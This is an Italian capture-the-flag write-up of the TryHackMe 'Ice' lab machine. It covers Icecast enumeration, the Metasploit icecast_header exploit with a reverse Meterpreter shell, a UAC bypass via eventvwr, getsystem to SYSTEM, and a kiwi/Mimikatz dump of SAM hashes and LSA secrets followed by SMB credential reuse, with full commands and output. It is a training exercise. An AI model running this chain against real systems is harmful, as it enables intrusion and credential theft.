---
layout: writeup
lang: it
permalink: /writeups/ice/
title: "Ice"
ref: ice
date: 2026-08-25
bare: true
platform: THM
os: Windows 7 Professional
difficulty: Easy
series: thm-windows
tags: [win, icecast, rce, meterpreter, uac-bypass, mimikatz]
txt: /writeups-files/ice.txt
summary: "RCE su Icecast, bypass UAC per arrivare a SYSTEM, dump di SAM e LSA secrets con kiwi. Ore perse su un servizio che si chiudeva da solo."
---

# Writeup — Ice (TryHackMe)

OS: Windows 7 Professional
Difficoltà: Easy
Data: 22–25 agosto 2026

---

## Sommario

Macchina Windows standalone. full port scan rivela SMB, RDP e una porta 8000 anomala che risulta essere un server Icecast per streaming audio. Nessuna versione recuperabile tramite banner o endpoint noti, solo la conferma generica di Icecast 2.x da /status.xsl trovato con gobuster. La pista SMB con accesso guest non porta a nessuna share visibile. Unico vettore rimasto è l'exploit Metasploit per Icecast header overwrite, che fallisce ripetutamente finché non si scopre che la porta 8000 sulla macchina assegnata si chiudeva da sola senza motivazioni precise. 
Dopo un riavvio della lab machine l'exploit funziona e produce una sessione Meterpreter come utente locale, bypass UAC per arrivare a NT SYSTEM con privilegi elevati, dump di SAM e LSA secrets con kiwi, riuso delle credenziali via SMB e conferma finale dei massimi privilegi leggendo la configurazione di Icecast sul disco.

Catena seguita: nmap full port → Icecast su 8000 → nessuna versione recuperabile → SMB guest senza share utili → Metasploit icecast_header fallisce su istanza con servizio non attivo → riavvio macchina → RCE riuscita → Meterpreter utente locale → bypass UAC → SYSTEM → dump credenziali → SMB login con credenziali dumped → lettura icecast.xml e di ogni altro file.

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco, spiegazione dettagliata di concetti tecnici e correzione di sintassi in comandi lunghi. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

---

## Premessa

room fatta in parte su AttackBox TryHackMe e in parte sulla mia macchina locale, passando dall'una all'altra quando il pc locale iniziava a rallentare troppo durante i tentativi ripetuti di exploit. 
la fase più lunga non è stata tecnica ma di puro stallo: l'exploit Metasploit contro Icecast falliva sempre allo stesso modo, e solo dopo numerosi tentativi su IP diversi si è capito che il problema non era la sintassi ma la macchina target stessa, che su alcuni spawn partiva con il servizio Icecast in ascolto sulla porta 8000 ma lo chiudeva dopo poco. 
gran parte della fase di post-exploitation, in particolare getsystem tramite bypass UAC e l'uso dell'estensione kiwi per il dump delle credenziali, sono passaggi che non conoscevo e che non avevo mai trattato scolasticamente, e ho seguito appoggiandomi alle indicazioni del walkthrough ufficiale della room senza le quali non avrei saputo come proseguire da una sessione con privilegi limitati.

---

## Fase 1 — Ricognizione

La room suggerisce esplicitamente un SYN scan su tutte le porte:

sudo nmap -Pn -sS -p- -T4 10.113.190.56

Risultato:

135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152-49184/tcp open  unknown (varie)

445 e 3389 sono i soliti sospetti su una macchina Windows tipici di queste challenge. quello che salta all'occhio davvero è la 8000, che non avevo mai notato in macchine simili. un'applicazione web esposta su quella porta è insolita

nmap -Pn -sC -sV -p8000 10.113.190.56

PORT     STATE SERVICE VERSION
8000/tcp open  http    Icecast streaming media server

svolgendo ricerche, noto che Icecast è un server per lo streaming audio via HTTP e viene indicato nell'introduzione alla room come vettore già sfruttato in passato su versioni vulnerabili.

---

## Fase 2 — Ricerca versione e content discovery

Prima di pensare all'exploit serve la versione esatta per metasploit. 
curl -I sulla porta 8000 non restituisce header utili, e uno scan mirato con nmap -sV sulla sola porta non aggiunge nulla oltre a quanto già trovato. Provo endpoint più noti a mano (server_version, admin) senza risultato,quindi passo a un content discovery con gobuster / fuzzing degli endpoint:

gobuster -m dir -u http://10.113.162.81:8000 -w /usr/share/dirb/wordlists/common.txt -x html,xml,xsl,txt

Unico risultato utile:

/status.xsl (Status: 200)

curl sull'endpoint restituisce una pagina HTML con titolo "Icecast 2 Status", che conferma la versione ma non la build esatta. Le versioni 2.x hanno CVE noti secondo exploit-db, ma per lanciare l'exploit corretto serve la build completa (2.X.X), che qui non compare da nessuna parte. Provo una wordlist più ampia (big.txt) senza trovare altro.

---

## Fase 3 — Pista SMB

Con la porta 8000 che non dà altre informazioni, provo SMB, l'unica pista rimasta anche se controintuitiva per il titolo della macchina e gli indizi su Icecast:

sudo nmap -Pn -sC -sV -p139,445 10.113.129.152

445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
smb-security-mode: account_used: guest, message signing disabled

L'accesso guest sembra accettato. provando login anonimo:

smbclient -L //10.113.129.152 -N

Anonymous login successful, ma nessuna share elencata (SMB1 disabled -- no workgroup available). Pista SMB rimane chiusa

---

## Fase 4 — Exploitation (+ fallimenti)

Su Metasploit c'è un solo modulo compatibile che la stessa room suggerisce:

exploit/windows/http/icecast_header (2004-09-28, rank great)

individuo i parametri richiesti: RHOSTS, RPORT (già 8000), e per il payload di default (windows/meterpreter/reverse_tcp) servono LHOST e LPORT. Uso l'IP della VPN (tun1) come LHOST:

msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS 10.113.129.152; set RPORT 8000; set LHOST 192.168.156.12; set LPORT 4444; run"

Started reverse TCP handler...
Exploit completed, but no session was created.

Nessuna sessione. riprovo cambiando payload (windows/shell_reverse_tcp) e poi su un IP diverso della macchina respawnata, ma stesso risultato.
 A questo punto mi faccio generare anche uno shellcode apposta per icecast in Python per bypassare metasploit del tutto:

python /tmp/exploit.py 10.113.164.135

Nemmeno questo produce nessuna connessione. 
Il pc locale inizia a rallentare parecchio con tutti questi tentativi e passo all'AttackBox di TryHackMe sperando cambi qualcosa. scan mirato rivela il problema reale:

nmap -Pn -p8000 -sV 10.113.164.135
8000/tcp closed http-alt

La porta 8000 si è chiusa su quella specifica istanza della macchina. Non è un problema di sintassi dell'exploit, è che il servizio Icecast semplicemente non parte su alcuni spawn/cessa di esistere. 
Dopo diversi dispendiosi riavvii della lab machine dalla piattaforma, trovo finalmente un'istanza con la porta aperta:

nmap -Pn -p- --open -T4 10.113.132.102
8000/tcp open  http-alt

Ore perse per un problema di infrastruttura della room, non di esecuzione. Rilancio l'exploit sul nuovo target settando i nuovi parametri:

msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS 10.113.132.102; set RPORT 8000; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.113.155.175; set LPORT 4444; run"

Meterpreter session 1 opened (10.113.155.175:4444 -> 10.113.132.102:49207)

Finalmente una sessione meterpreter.

---

## Fase 5 — Post exploitation e privilege escalation

Verifico l'utente corrente acquisito alla generazione:

meterpreter > getuid
Server username: Dark-PC\Dark

meterpreter > getprivs

Solo privilegi limitati (SeChangeNotifyPrivilege e simili inutili), niente che suggerisca privilegi amministrativi. 
provo comunque getsystem , tecnica di privilege escalation automatica di Meterpreter che conoscevo solo per nome e spiegata da forum e chatbot(tenta impersonation su named pipe e una token duplication):

meterpreter > getsystem
[-] Named Pipe Impersonation (In Memory/Admin): fallito
[-] Token Duplication (In Memory/Admin): fallito
(tutte le tecniche disponibili falliscono)

provo a creare una shell per raccogliere informazioni in più sul sistema:

meterpreter > shell
C:\Program Files (x86)\Icecast2 Win32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

OS Name: Microsoft Windows 7 Professional
OS Version: 6.1.7601 Service Pack 1
System Type: x64-based PC

Torno su Meterpreter e uso local_exploit_suggester per capire quali exploit sono applicabili:

meterpreter > run post/multi/recon/local_exploit_suggester

exploit/windows/local/bypassuac_eventvwr: The target is vulnerable. Likely exploitable

Lancio il bypass UAC come consiglia metasploit:

use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST 10.113.155.175
run

Meterpreter session 2 opened

Nuova sessione, ma getuid restituisce ancora Dark-PC\Dark e non altro. 
nonostante questo la sessione 2 ha molti più privilegi abilitati (SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, altri). Riprovo getsystem su questa sessione:

sessions -C "getsystem" -i 2
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

sessions -C "getuid" -i 2
Server username: NT AUTHORITY\SYSTEM

il bypass UAC ha sbloccato i privilegi necessari perché Named Pipe Impersonation, fallita prima, funzionasse.
Ora abbiamo pieni privilegi

Catena di escalation: Icecast RCE → Meterpreter utente locale → bypass UAC (eventvwr) → privilegi elevati → Named Pipe Impersonation → SYSTEM.

---

## Fase 6 — Dump credenziali e movimento laterale

Con SYSTEM provo prima a cercare le flag direttamente con delle query:

sessions -C "search -f *flag*" -i 2
No files matching your search were found.

Niente flags. 
Però controllando il walkthrough della room emerge che non esistono/sono richieste flags e che per trovare i dati richiesti va usata un'estensione di Meterpreter dedicata al dump di credenziali che non conoscevo, kiwi (la versione integrata di Mimikatz). La carico:

meterpreter > load kiwi
meterpreter > creds_all
[+] Running as SYSTEM

meterpreter > lsa_dump_sam

RID 000001f4 (500) - Administrator: Hash NTLM 31d6cfe0d16ae931b73c59d7e0c089c0
RID 000003e8 (1000) - Dark: Hash NTLM 7c4fe5eada682714a036e39378362bab

meterpreter > lsa_dump_secrets

Secret: DefaultPassword
cur/text: Password01!

Password in chiaro dell'utente Dark recuperata dai secrets LSA. La riuso direttamente per autenticarmi via SMB:

background
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.113.132.102
set SMBUser Dark
set SMBPass Password01!
set CreateSession true
run

Success: '.\Dark:Password01!'
SMB session 3 opened

sessions -i 3
SMB (10.113.132.102) > shares

ADMIN$, C$, IPC$ — le share amministrative di default, accessibili ora con le credenziali recuperate.

---

## Fase 7 — Conferma finale sul filesystem

Torno sulla sessione Meterpreter SYSTEM per esplorare il filesystem e confermare la compromissione totale:

meterpreter > cd C:\Users\Dark\Desktop
meterpreter > ls

Icecast2 Win32.lnk, icecast.exe

meterpreter > search -f icecast.xml

c:\Program Files (x86)\Icecast2 Win32\icecast.xml

meterpreter > cat "C:\Program Files (x86)\Icecast2 Win32\icecast.xml"

<source-password>hackme</source-password>
<admin-user>admin</admin-user>
<admin-password>hackme</admin-password>
<listen-socket><port>8000</port></listen-socket>

Configurazione completa di Icecast recuperata, incluse le credenziali amministrative dell'applicazione stessa (admin/hackme, la password di default nota di Icecast, mai cambiata su questa installazione).

Prima di arrivare a icecast.xml avevo navigato liberamente in C:\Windows\system32, listato tutti i profili in C:\Users (incluse cartelle più riservate come "All Users" e "Default User"), letto tutto il contenuto del profilo di Dark incluso NTUSER.DAT, ed elencato le share amministrative ADMIN$ e C$ via SMB, tutte azioni che un utente standard non potrebbe fare

Es: meterpreter > cd C:\Users\Dark
meterpreter > ls
Listing: C:\Users\Dark
======================
100666/rw-rw-rw-  524288  fil  2026-08-25 17:38:23  NTUSER.DAT
100666/rw-rw-rw-  262144  fil  2026-08-25 17:38:23  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil  2019-11-12 22:48:31  ntuser.dat.LOG2
ecc...

---

## Catena completa

nmap full port scan → SMB, RDP, Icecast su 8000
→ nessuna versione recuperabile da banner o endpoint noti
→ gobuster trova /status.xsl → conferma solo Icecast 2.x generico
→ SMB guest accessibile ma senza share utili
→ Metasploit icecast_header fallisce ripetutamente
→ scoperta: porta 8000 chiusa su quello spawn della macchina
→ riavvio lab machine → porta 8000 aperta
→ RCE riuscita → Meterpreter Dark-PC\Dark
→ getsystem diretto fallisce
→ bypass UAC (eventvwr) → privilegi ampliati
→ getsystem via Named Pipe Impersonation → NT AUTHORITY\SYSTEM
→ kiwi: dump SAM e LSA secrets → password in chiaro di Dark
→ SMB login con credenziali dumped → accesso alle share amministrative
→ lettura icecast.xml → credenziali admin dell'applicazione

---

## Lezioni apprese

Quando un exploit che dovrebbe funzionare fallisce sempre nello stesso identico modo su target diversi, vale la pena controllare lo stato reale del servizio sul target prima di continuare a cambiare parametri sull'exploit. In questo caso il problema non era mai stato mio.

---

## Tool utilizzati

nmap, gobuster, smbclient, msfconsole (exploit/windows/http/icecast_header, exploit/windows/local/bypassuac_eventvwr, post/multi/recon/local_exploit_suggester, auxiliary/scanner/smb/smb_login), Meterpreter (kiwi)
